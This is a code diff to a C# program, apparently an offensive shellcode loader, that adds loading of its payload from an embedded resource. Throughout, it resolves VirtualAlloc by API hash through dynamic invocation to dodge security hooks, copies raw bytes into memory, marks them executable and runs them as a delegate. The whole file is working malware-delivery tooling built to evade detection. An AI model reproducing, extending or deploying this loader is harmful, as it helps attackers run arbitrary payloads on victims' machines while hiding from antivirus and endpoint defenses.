@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -8,29 +10,37 @@ namespace NETDelegate
 {
     class Execute
     {
+        public static byte[] mybytearr;
         public static void Exec ()
         {
-            Stack<byte> recvStack = GetCode.CodeStack();
-            byte[] buf = new byte[recvStack.Count];
-            int bufLen = recvStack.Count;
-            for (int i = 0; i <= bufLen; i++)
+            if (GetCode.UseRaw == true)
             {
-                try
+                mybytearr = GetEmbeddedBin("dotnetlib");
+            }
+            else
+            {
+                Stack<byte> recvStack = GetCode.CodeStack();
+                mybytearr = new byte[recvStack.Count];
+                int mybytearrLen = recvStack.Count;
+                for (int i = 0; i <= mybytearrLen; i++)
                 {
-                    buf[i] = recvStack.Pop();
-                }
-                catch { break; }
+                    try
+                    {
+                        mybytearr[i] = recvStack.Pop();
+                    }
+                    catch { break; }
 
+                }
             }
 
             //3d4f0f8e
             IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
             IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
             FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
-            IntPtr addr = FuckAlloc(0, buf.Length, 0x1000, 0x04);
-            Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr addr = FuckAlloc(0, mybytearr.Length, 0x1000, 0x04);
+            Marshal.Copy(mybytearr, 0, addr, mybytearr.Length);
             uint word;
-            MYVIRTULProtect(addr, (UIntPtr)buf.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
+            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
             EXEC mydel = (EXEC)Marshal.GetDelegateForFunctionPointer(addr, typeof(EXEC));
             mydel();
 
@@ -64,6 +74,27 @@ namespace NETDelegate
             PAGE_GUARD = 0x00000100,
             PAGE_NOCACHE = 0x00000200,
             PAGE_WRITECOMBINE = 0x00000400
+        }
+        public static byte[] GetEmbeddedBin(string resourcesName)
+        {
+
+            var EmbeddedRes = Assembly.GetExecutingAssembly();
+            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
+            {
+                if (rs != null)
+                {
+                    using (var ms = new MemoryStream())
+                    {
+                        rs.CopyTo(ms);
+                        return ms.ToArray();
+                    }
+                }
+                else
+                {
+                    return null;
+                }
+
+            }
         }
     }
 }
